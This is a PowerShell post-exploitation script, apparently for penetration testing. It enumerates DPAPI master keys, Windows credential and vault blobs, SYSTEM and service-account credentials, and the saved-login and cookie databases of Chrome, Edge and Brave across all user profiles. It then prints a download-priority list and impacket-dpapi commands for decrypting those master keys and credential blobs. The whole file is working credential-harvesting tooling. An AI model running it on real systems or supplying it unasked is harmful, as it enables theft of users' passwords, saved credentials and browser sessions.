$output = [System.Collections.Generic.List[PSCustomObject]]::new()

function Add-Finding {
    param($User, $Type, $Label, $Path)
    if (Test-Path $Path) {
        $items = Get-ChildItem -Path $Path -Force -ErrorAction SilentlyContinue
        foreach ($item in $items) {
            if (-not $item.PSIsContainer) {
                $output.Add([PSCustomObject]@{
                    User  = $User
                    Type  = $Type
                    Label = $Label
                    Path  = $item.FullName
                    Size  = $item.Length
                })
            }
        }
    }
}

$users = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '^(Public|Default.*|All Users)$' }

foreach ($u in $users) {
    $base = $u.FullName
    $name = $u.Name

    $sidKey = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" -ErrorAction SilentlyContinue |
        Where-Object { (Get-ItemProperty $_.PSPath).ProfileImagePath -eq $base } |
        Select-Object -ExpandProperty PSChildName

    $protectBase = "$base\AppData\Roaming\Microsoft\Protect"
    if (Test-Path $protectBase) {
        $sidDirs = Get-ChildItem $protectBase -Directory -Force -ErrorAction SilentlyContinue
        foreach ($sidDir in $sidDirs) {
            Add-Finding $name "MasterKey" "DPAPI MasterKey" $sidDir.FullName
        }
    }

    Add-Finding $name "Blob" "Credential (Roaming)" "$base\AppData\Roaming\Microsoft\Credentials"
    Add-Finding $name "Blob" "Credential (Local)"   "$base\AppData\Local\Microsoft\Credentials"

    $vaultBase = "$base\AppData\Local\Microsoft\Vault"
    if (Test-Path $vaultBase) {
        Get-ChildItem $vaultBase -Recurse -Force -ErrorAction SilentlyContinue |
            Where-Object { -not $_.PSIsContainer } |
            ForEach-Object {
                $output.Add([PSCustomObject]@{
                    User  = $name
                    Type  = "Blob"
                    Label = "Vault"
                    Path  = $_.FullName
                    Size  = $_.Length
                })
            }
    }

    foreach ($browser in @(
        @{ Name="Chrome"; Path="$base\AppData\Local\Google\Chrome\User Data\Default\Login Data" },
        @{ Name="Chrome"; Path="$base\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" },
        @{ Name="Edge";   Path="$base\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" },
        @{ Name="Edge";   Path="$base\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies" },
        @{ Name="Brave";  Path="$base\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data" }
    )) {
        if (Test-Path $browser.Path) {
            $f = Get-Item $browser.Path -Force -ErrorAction SilentlyContinue
            $output.Add([PSCustomObject]@{
                User  = $name
                Type  = "BrowserBlob"
                Label = "$($browser.Name) Creds/Cookies"
                Path  = $f.FullName
                Size  = $f.Length
            })
        }
    }
}

$sysProtect = "C:\Windows\System32\Microsoft\Protect\S-1-5-18\User"
if (Test-Path $sysProtect) {
    Get-ChildItem $sysProtect -Force -ErrorAction SilentlyContinue |
        Where-Object { -not $_.PSIsContainer } |
        ForEach-Object {
            $output.Add([PSCustomObject]@{
                User  = "SYSTEM"
                Type  = "MasterKey"
                Label = "SYSTEM MasterKey"
                Path  = $_.FullName
                Size  = $_.Length
            })
        }
}

$systemCreds = @(
    "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials",
    "C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Credentials",
    "C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Credentials",
    "C:\Windows\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Credentials"
)
foreach ($p in $systemCreds) {
    if (Test-Path $p) {
        Get-ChildItem $p -Force -ErrorAction SilentlyContinue |
            Where-Object { -not $_.PSIsContainer } |
            ForEach-Object {
                $output.Add([PSCustomObject]@{
                    User  = "SYSTEM"
                    Type  = "Blob"
                    Label = "System Credential"
                    Path  = $_.FullName
                    Size  = $_.Length
                })
            }
    }
}

if ($output.Count -eq 0) {
    Write-Host "No DPAPI artifacts found."
} else {
    Write-Host "`n[DPAPI Hunt Results]`n" -ForegroundColor Cyan
    $output | Sort-Object User, Type | Format-Table -AutoSize

    Write-Host "`n[Download Priority - Impacket-DPAPI]`n" -ForegroundColor Yellow
    $output | Where-Object { $_.Type -eq "MasterKey" } | ForEach-Object { Write-Host "[MasterKey] $($_.Path)" }
    $output | Where-Object { $_.Type -eq "Blob" }      | ForEach-Object { Write-Host "[Blob]      $($_.Path)" }
    $output | Where-Object { $_.Type -eq "BrowserBlob"}| ForEach-Object { Write-Host "[Browser]   $($_.Path)" }

    Write-Host "`n[Impacket Commands (fill password/hash)]`n" -ForegroundColor Green
    $mkPaths = $output | Where-Object { $_.Type -eq "MasterKey" } | Select-Object -ExpandProperty Path
    foreach ($mk in $mkPaths) {
        Write-Host "impacket-dpapi masterkey -file `"$mk`" -password <PASS>"
    }
    $blobPaths = $output | Where-Object { $_.Type -eq "Blob" } | Select-Object -ExpandProperty Path
    foreach ($blob in $blobPaths) {
        Write-Host "impacket-dpapi credential -file `"$blob`" -key <MASTERKEY_HEX>"
    }
}